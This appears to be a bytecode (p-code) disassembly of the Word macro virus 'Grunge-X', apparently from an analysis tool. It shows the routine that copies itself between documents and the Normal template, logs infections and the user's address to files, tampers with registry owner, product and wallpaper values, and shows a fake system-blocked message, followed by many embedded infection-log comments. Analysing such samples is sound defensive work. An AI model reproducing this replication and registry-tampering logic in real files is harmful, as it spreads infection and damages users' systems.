' 	GoSub InsertIon 
' Line #79:
' 	LineCont 0x0004 0A 00 03 00
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000A "LogData in"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	GoSub LoggingIn 
' 	EndIf 
' Line #80:
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoSub ShowMe 
' 	EndIf 
' Line #81:
' 	GoTo Finish 
' Line #82:
' 	Label InsertIon 
' Line #83:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AD 
' Line #84:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NT 
' Line #85:
' 	Ld Grunge 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St Di 
' Line #86:
' 	Ld Grunge 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NTI 
' Line #87:
' 	Ld Di 
' 	Ld NTI 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #88:
' 	Ld Di 
' 	IfBlock 
' Line #89:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St NTS 
' Line #90:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St XJhie 
' Line #91:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #92:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #93:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #94:
' 	Ld Users 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St Users 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	ElseBlock 
' Line #97:
' 	Ld Users 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 " '"
' 	Concat 
' 	St Users 
' Line #98:
' 	EndIfBlock 
' Line #99:
' 	StartForVariable 
' 	Next 
' Line #100:
' 	LineCont 0x0018 09 00 09 00 10 00 09 00 17 00 09 00 20 00 10 00 2C 00 09 00 37 00 09 00
' 	Ld XJhie 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0023 "'The Sun Is Gone But I have I Light"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0031 "'================================================"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0011 "'Date Infected : "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x000E "hh:mm:ss AMPM-"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0011 "'User Infected : "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0011 "'Mail to       : "
' 	Concat 
' 	Ld Users 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	St XJhie 
' Line #101:
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0012 "Grunge Include Day"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #102:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #103:
' 	Ld XJhie 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #104:
' 	Ld NTS 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	Ld NTI 
' 	IfBlock 
' Line #107:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St DS 
' Line #108:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St XJhie 
' Line #109:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #110:
' 	QuoteRem 0x0007 0x0007 "======="
' Line #111:
' 	SetStmt 
' 	Ld Application 
' 	MemLd Templates 
' 	MemLd Application 
' 	MemLd Path 
' 	LitStr 0x000B "\Engine.dll"
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	Set NameModule 
' Line #112:
' 	LitStr 0x0013 "Grunge_Still_A_Live"
' 	Ld NameModule 
' 	MemSt New 
' Line #113:
' 	StartForVariable 
' 	Ld ObDel 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #114:
' 	Ld ObDel 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	Ld ObDel 
' 	MemLd New 
' 	LitStr 0x0013 "Grunge_Still_A_Live"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #115:
' 	LineCont 0x0004 09 00 10 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ObDel 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #116:
' 	EndIfBlock 
' Line #117:
' 	StartForVariable 
' 	Ld ObDel 
' 	EndForVariable 
' 	NextVar 
' Line #118:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St f1 
' Line #119:
' 	Ld f1 
' 	LitStr 0x0009 "\OSGrunge"
' 	Concat 
' 	ArgsCall MkDir 0x0001 
' Line #120:
' 	Ld AName 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0012 "Grunge Include Day"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #121:
' 	Ld f1 
' 	LitStr 0x0010 "\OSGrunge\Grunge"
' 	Concat 
' 	Ld AName 
' 	Concat 
' 	LitStr 0x0004 ".ini"
' 	Concat 
' 	Ld MyIndex 
' 	Concat 
' 	Ld FileNumber 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #122:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 " "
' 	PrintItemNL 
' Line #123:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 " "
' 	PrintItemNL 
' Line #124:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "Date Infected : "
' 	Ld Time 
' 	LitStr 0x000D "hh:mm:ss AMPM"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitStr 0x0003 " - "
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0012 "dddd  dd-mmmm-yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	PrintItemNL 
' Line #125:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "User Infected : "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	PrintItemNL 
' Line #126:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "Mail to       : "
' 	Ld Application 
' 	MemLd UserAddress 
' 	Concat 
' 	PrintItemNL 
' Line #127:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "Number Inf    : "
' 	Ld AName 
' 	Concat 
' 	PrintItemNL 
' Line #128:
' 	Ld FileNumber 
' 	Sharp 
' 	Close 0x0001 
' Line #129:
' 	Ld XJhie 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #130:
' 	Ld DS 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #131:
' 	EndIfBlock 
' Line #132:
' 	EndIfBlock 
' Line #133:
' 	Return 
' Line #134:
' 	Label LoggingIn 
' Line #135:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000A "LogData in"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #136:
' 	GoSub ShowMe 
' Line #137:
' 	Return 
' Line #138:
' 	Label ShowMe 
' Line #139:
' 	Dim 
' 	VarDefn FileSys (As String)
' Line #140:
' 	OnError (Resume Next) 
' Line #141:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St FileSys 
' Line #142:
' 	Ld FileSys 
' 	LitStr 0x000D "\Grunge-X.Htm"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #143:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "<html>"
' 	PrintItemNL 
' Line #144:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "<head>"
' 	PrintItemNL 
' Line #145:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0038 "<title>I Hate EveryBody If EveryBody Not Like Me</title>"
' 	PrintItemNL 
' Line #146:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0030 "<meta name='Author' content='Include By Jhie-X'>"
' 	PrintItemNL 
' Line #147:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0055 "<body text='#FFFFFF' bgcolor='077d41' link='#FFFFFF' vlink='#FFFFFF' alink='#FFFFFF'>"
' 	PrintItemNL 
' Line #148:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0076 "<center><p align='center'><font color='#800000'size='6'>The Sun Is Gone But I Have I Light<strong></strong></font></p>"
' 	PrintItemNL 
' Line #149:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x008C "<p align='center'><font color='#000000' size='5'><strong><a href='mailto:WWW.Grunge@Usa.Net.com'>WWW.Grunge@Usa.Net</a></strong></font> </p>"
' 	PrintItemNL 
' Line #150:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x005B "<InTemp><font face='Arial,Helvetica'><font size=+2><b>Hey Guys How Are You Today</b></font>"
' 	PrintItemNL 
' Line #151:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003C "<p><table BORDER=0 CELLSPACING=0 CELLPADDING=0 WIDTH='600' >"
' 	PrintItemNL 
' Line #152:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "<tr>"
' 	PrintItemNL 
' Line #153:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004E "<InTemp><center><img SRC='C:\Logo.sys' height=380 width=750 border=3></center>"
' 	PrintItemNL 
' Line #154:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "</InTemp>"
' 	PrintItemNL 
' Line #155:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "</tr>"
' 	PrintItemNL 
' Line #156:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "</table>"
' 	PrintItemNL 
' Line #157:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003A "<tr><InTemp><font face='arial, helvetica' size=-2><center>"
' 	PrintItemNL 
' Line #158:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0053 "<p><font face='Arial,Helvetica'><font size=-2>Copyright Jhie-X. All rights reserved"
' 	PrintItemNL 
' Line #159:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0041 "<br>Logo and website content are trademarks of Grunge Cooperation"
' 	PrintItemNL 
' Line #160:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "</font></font></center>"
' 	PrintItemNL 
' Line #161:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "</InTemp></tr></table>"
' 	PrintItemNL 
' Line #162:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "</html>"
' 	PrintItemNL 
' Line #163:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #164:
' 	Ld FileSys 
' 	LitStr 0x000D "\Grunge-X.Htm"
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0046 "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General"
' 	LitStr 0x0009 "Wallpaper"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #165:
' 	Ld FileSys 
' 	LitStr 0x000D "\Grunge-X.Htm"
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0042 "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Setup"
' 	LitStr 0x0009 "Wallpaper"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #166:
' 	Ld FileSys 
' 	LitStr 0x000D "\Grunge-X.Htm"
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0026 "HKEY_CURRENT_USER\Contrl Panel\Desktop"
' 	LitStr 0x0009 "Wallpaper"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #167:
' 	LitStr 0x001B "    * Grunge Still A Live *"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #168:
' 	LitStr 0x0018 "* Ujung Berung Bandung *"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #169:
' 	LitStr 0x001A "Grunge-X Created by X-Jhie"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000B "ProductName"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #170:
' 	LitStr 0x001B "Grunge-X Version 7010733465"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0007 "Version"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #171:
' 	LitStr 0x0021 "Grunge-X Include on Your SoftWare"
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "DefName"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #172:
' 	LitStr 0x0041 "Copyright By Grunge-X (I Hate EveryBody If EveryBody Not Like Me""
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000A "DefCompany"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #173:
' 	Return 
' Line #174:
' 	Label Finish 
' Line #175:
' 	EndSub 
' Line #176:
' Line #177:
' 	QuoteRem 0x0000 0x0022 "The Sun Is Gone But I have I Light"
' Line #178:
' 	QuoteRem 0x0000 0x0030 "================================================"
' Line #179:
' 	QuoteRem 0x0000 0x002F "Date Infected : 10:43:39 PM-Sunday, 23 Jul 2000"
' Line #180:
' 	QuoteRem 0x0000 0x0023 "User Infected : Grunge-X Include in"
' Line #181:
' 	QuoteRem 0x0000 0x0020 "Mail to       : Grunge-X@usa.net"
' Line #182:
' Line #183:
' Line #184:
' Line #185:
' Line #186:
' Line #187:
' Line #188:
' Line #189:
' 	QuoteRem 0x0000 0x0022 "The Sun Is Gone But I have I Light"
' Line #190:
' 	QuoteRem 0x0000 0x0030 "================================================"
' Line #191:
' 	QuoteRem 0x0000 0x0035 "Date Infected : 11:08:56 BHO-I-Wednesday, 26 Jul 2000"
' Line #192:
' 	QuoteRem 0x0000 0x0023 "User Infected : Grunge-X Include in"
' Line #193:
' 	QuoteRem 0x0000 0x0020 "Mail to       : Grunge-X@usa.net"
' Line #194:
' Line #195:
' Line #196:
' Line #197:
' Line #198:
' 	QuoteRem 0x0000 0x0022 "The Sun Is Gone But I have I Light"
' Line #199:
' 	QuoteRem 0x0000 0x0030 "================================================"
' Line #200:
' 	QuoteRem 0x0000 0x0032 "Date Infected : 04:19:23 ABENK-Sunday, 30 Jul 2000"
' Line #201:
' 	QuoteRem 0x0000 0x0023 "User Infected : Grunge-X Include in"
' Line #202:
' 	QuoteRem 0x0000 0x0020 "Mail to       : Grunge-X@usa.net"
' Line #203:
' Line #204:
' Line #205:
' Line #206:
' Line #207:
' 	QuoteRem 0x0000 0x0022 "The Sun Is Gone But I have I Light"
' Line #208:
' 	QuoteRem 0x0000 0x0030 "================================================"
' Line #209:
' 	QuoteRem 0x0000 0x002E "Date Infected : 10:25:31 -Kamis, 10 Agust 2000"
' Line #210:
' 	QuoteRem 0x0000 0x0023 "User Infected : Grunge-X Include in"
' Line #211:
' 	QuoteRem 0x0000 0x0020 "Mail to       : Grunge-X@usa.net"
' Line #212:
' Line #213:
' Line #214:
' Line #215:
' Line #216:
' 	QuoteRem 0x0000 0x0022 "The Sun Is Gone But I have I Light"
' Line #217:
' 	QuoteRem 0x0000 0x0030 "================================================"
' Line #218:
' 	QuoteRem 0x0000 0x0030 "Date Infected : 11:59:37 AM-Tuesday, 31 Oct 2000"
' Line #219:
' 	QuoteRem 0x0000 0x0023 "User Infected : Grunge-X Include in"
' Line #220:
' 	QuoteRem 0x0000 0x0020 "Mail to       : Grunge-X@usa.net"
' Line #221:
' Line #222:
' Line #223:
' Line #224:
' Line #225:
' 	QuoteRem 0x0000 0x0022 "The Sun Is Gone But I have I Light"
' Line #226:
' 	QuoteRem 0x0000 0x0030 "================================================"
' Line #227:
' 	QuoteRem 0x0000 0x002F "Date Infected : 05:46:23 PM-Tuesday, 7 Nov 2000"
' Line #228:
' 	QuoteRem 0x0000 0x0023 "User Infected : Grunge-X Include in"
' Line #229:
' 	QuoteRem 0x0000 0x0020 "Mail to       : Grunge-X@usa.net"
' Line #230:
' Line #231:
' Line #232:
' Line #233:
' Line #234:
' 	QuoteRem 0x0000 0x0022 "The Sun Is Gone But I have I Light"
' Line #235:
' 	QuoteRem 0x0000 0x0030 "================================================"
' Line #236:
' 	QuoteRem 0x0000 0x0030 "Date Infected : 12:41:29 PM-Tuesday, 19 Dec 2000"
' Line #237:
' 	QuoteRem 0x0000 0x0023 "User Infected : Grunge-X Include in"
' Line #238:
' 	QuoteRem 0x0000 0x0020 "Mail to       : Grunge-X@usa.net"
' Line #239:
' Line #240:
' Line #241:
' Line #242:
' Line #243:
' 	QuoteRem 0x0000 0x0022 "The Sun Is Gone But I have I Light"
' Line #244:
' 	QuoteRem 0x0000 0x0030 "================================================"
' Line #245:
' 	QuoteRem 0x0000 0x002E "Date Infected : 03:06:28 PM-Monday, 5 Mar 2001"
' Line #246:
' 	QuoteRem 0x0000 0x0023 "User Infected : Grunge-X Include in"
' Line #247:
' 	QuoteRem 0x0000 0x0020 "Mail to       : Grunge-X@usa.net"
' Line #248:
' Line #249:
' Line #250:
' Line #251:
' Line #252:
' 	QuoteRem 0x0000 0x0022 "The Sun Is Gone But I have I Light"
' Line #253:
' 	QuoteRem 0x0000 0x0030 "================================================"
' Line #254:
' 	QuoteRem 0x0000 0x002F "Date Infected : 09:14:42 PM-Monday, 27 Aug 2001"
' Line #255:
' 	QuoteRem 0x0000 0x0023 "User Infected : Grunge-X Include in"
' Line #256:
' 	QuoteRem 0x0000 0x0020 "Mail to       : Grunge-X@usa.net"
' Line #257:
' Line #258:
' Line #259:
' Line #260:
' Line #261:
' 	QuoteRem 0x0000 0x0022 "The Sun Is Gone But I have I Light"
' Line #262:
' 	QuoteRem 0x0000 0x0030 "================================================"
' Line #263:
' 	QuoteRem 0x0000 0x0030 "Date Infected : 10:50:28 AM-Saturday, 6 Oct 2001"
' Line #264:
' 	QuoteRem 0x0000 0x0023 "User Infected : Grunge-X Include in"
' Line #265:
' 	QuoteRem 0x0000 0x0020 "Mail to       : Grunge-X@usa.net"
' Line #266:
' Line #267:
' Line #268:
' Line #269:
' Line #270:
' 	QuoteRem 0x0000 0x0022 "The Sun Is Gone But I have I Light"
' Line #271:
' 	QuoteRem 0x0000 0x0030 "================================================"
' Line #272:
' 	QuoteRem 0x0000 0x002F "Date Infected : 04:26:26 PM-Friday, 12 Oct 2001"
' Line #273:
' 	QuoteRem 0x0000 0x0023 "User Infected : Grunge-X Include in"
' Line #274:
' 	QuoteRem 0x0000 0x0020 "Mail to       : Grunge-X@usa.net"
' Line #275:
' Line #276:
' Line #277:
' Line #278:
' Line #279:
' 	QuoteRem 0x0000 0x0022 "The Sun Is Gone But I have I Light"
' Line #280:
' 	QuoteRem 0x0000 0x0030 "================================================"
' Line #281:
' 	QuoteRem 0x0000 0x002F "Date Infected : 05:33:13 PM-Friday, 26 Oct 2001"
' Line #282:
' 	QuoteRem 0x0000 0x0023 "User Infected : Grunge-X Include in"
' Line #283:
' 	QuoteRem 0x0000 0x0020 "Mail to       : Grunge-X@usa.net"
' Line #284:
' Line #285:
' Line #286:
' Line #287:
' Line #288:
' 	QuoteRem 0x0000 0x0022 "The Sun Is Gone But I have I Light"
' Line #289:
' 	QuoteRem 0x0000 0x0030 "================================================"
' Line #290:
' 	QuoteRem 0x0000 0x0030 "Date Infected : 03:52:20 PM-Tuesday, 30 Oct 2001"
' Line #291:
' 	QuoteRem 0x0000 0x0023 "User Infected : Grunge-X Include in"
' Line #292:
' 	QuoteRem 0x0000 0x0020 "Mail to       : Grunge-X@usa.net"
' Line #293:
' Line #294:
' Line #295:
' Line #296:
' Line #297:
' 	QuoteRem 0x0000 0x0022 "The Sun Is Gone But I have I Light"
' Line #298:
' 	QuoteRem 0x0000 0x0030 "================================================"
' Line #299:
' 	QuoteRem 0x0000 0x0032 "Date Infected : 07:02:07 PM-Wednesday, 31 Oct 2001"
' Line #300:
' 	QuoteRem 0x0000 0x0023 "User Infected : Grunge-X Include in"
' Line #301:
' 	QuoteRem 0x0000 0x0020 "Mail to       : Grunge-X@usa.net"
' Line #302:
' Line #303:
' Line #304:
' Line #305:
' Line #306:
' 	QuoteRem 0x0000 0x0022 "The Sun Is Gone But I have I Light"
' Line #307:
' 	QuoteRem 0x0000 0x0030 "================================================"
' Line #308:
' 	QuoteRem 0x0000 0x0031 "Date Infected : 05:08:59 PM-Saturday, 17 Nov 2001"
' Line #309:
' 	QuoteRem 0x0000 0x0023 "User Infected : Grunge-X Include in"
' Line #310:
' 	QuoteRem 0x0000 0x0020 "Mail to       : Grunge-X@usa.net"
' Line #311:
' Line #312:
' Line #313:
' Line #314:
' Line #315:
' 	QuoteRem 0x0000 0x0022 "The Sun Is Gone But I have I Light"
' Line #316:
' 	QuoteRem 0x0000 0x0030 "================================================"
' Line #317:
' 	QuoteRem 0x0000 0x002F "Date Infected : 04:57:22 PM-Tuesday, 8 Jan 2002"
' Line #318:
' 	QuoteRem 0x0000 0x0023 "User Infected : Grunge-X Include in"
' Line #319:
' 	QuoteRem 0x0000 0x0020 "Mail to       : Grunge-X@usa.net"
' Line #320:
' Line #321:
' Line #322:
' Line #323:
' Line #324:
' 	QuoteRem 0x0000 0x0022 "The Sun Is Gone But I have I Light"
' Line #325:
' 	QuoteRem 0x0000 0x0030 "================================================"
' Line #326:
' 	QuoteRem 0x0000 0x0032 "Date Infected : 02:18:44 PM-Wednesday, 30 Jan 2002"
' Line #327:
' 	QuoteRem 0x0000 0x0023 "User Infected : Grunge-X Include in"
' Line #328:
' 	QuoteRem 0x0000 0x0020 "Mail to       : Grunge-X@usa.net"
' Line #329:
' Line #330:
' Line #331:
' Line #332:
' Line #333:
' 	QuoteRem 0x0000 0x0022 "The Sun Is Gone But I have I Light"
' Line #334:
' 	QuoteRem 0x0000 0x0030 "================================================"
' Line #335:
' 	QuoteRem 0x0000 0x002C "Date Infected : 01:51:16 -ńđĺäŕ, 13 ôĺâ 2002"
' Line #336:
' 	QuoteRem 0x0000 0x0023 "User Infected : Grunge-X Include in"
' Line #337:
' 	QuoteRem 0x0000 0x0020 "Mail to       : Grunge-X@usa.net"
' Line #338:
' Line #339:
' Line #340:
' Line #341:
' Line #342:
' 	QuoteRem 0x0000 0x0022 "The Sun Is Gone But I have I Light"
' Line #343:
' 	QuoteRem 0x0000 0x0030 "================================================"
' Line #344:
' 	QuoteRem 0x0000 0x0031 "Date Infected : 10:25:20 dop.-pondělí, 4 III 2002"
' Line #345:
' 	QuoteRem 0x0000 0x0023 "User Infected : Grunge-X Include in"
' Line #346:
' 	QuoteRem 0x0000 0x0020 "Mail to       : Grunge-X@usa.net"
' Line #347:
' Line #348:
' Line #349:
' Macros/VBA/Grunge_Still_A_Live - 3701 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0024 "This Is Quick Load in your Documents"
' Line #1:
' 	QuoteRem 0x0000 0x0025 "====================================="
' Line #2:
' 	FuncDefn (Sub ToolsMacro())
' Line #3:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #4:
' 	Ld msoButtonSetOK 
' 	MemStWith Button 
' Line #5:
' 	LitStr 0x001B "GRUNGE Is Block Your System"
' 	MemStWith Heading 
' Line #6:
' 	LineCont 0x000C 0A 00 00 00 11 00 00 00 18 00 00 00
' 	LitStr 0x001E "System Is Disabled By (Grunge)"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001B "You Can't Open VBMacro Code"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0029 "On this time, because the System is Busy."
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x002A "please check on your administrator system."
' 	Concat 
' 	MemStWith Then 
' Line #7:
